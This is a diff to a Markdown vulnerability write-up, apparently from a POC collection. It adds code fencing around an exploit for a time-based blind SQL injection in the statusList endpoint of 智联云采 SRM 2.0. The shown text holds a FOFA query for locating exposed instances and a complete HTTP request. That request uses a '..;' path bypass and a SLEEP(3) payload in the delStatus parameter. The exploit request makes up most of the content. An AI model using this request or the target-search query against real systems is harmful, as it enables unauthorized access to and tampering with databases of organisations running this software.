@@ -85,6 +85,7 @@ FOFA：title=="SRM 2.0"
 
 POC/EXP：延时3秒，执行2次 
 
+```http
 POST /adpweb/static/..;/a/sys/sysMessage/statusList?companyName=1&officeName=1&orderBy=1&receiverName=1&sourceMessageId=1&delStatus=1%20AND%20(SELECT%207104%20FROM%20(SELECT(SLEEP(3)))xZoa) HTTP/1.1
 Host:127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
@@ -92,6 +93,8 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 Connection: keep-alive
+```
+
 
 ![image-20241121163304400](./.resource/智联云采SRM2.0statusList处SQL注入漏洞/media/image-20241121163304400.png)
 
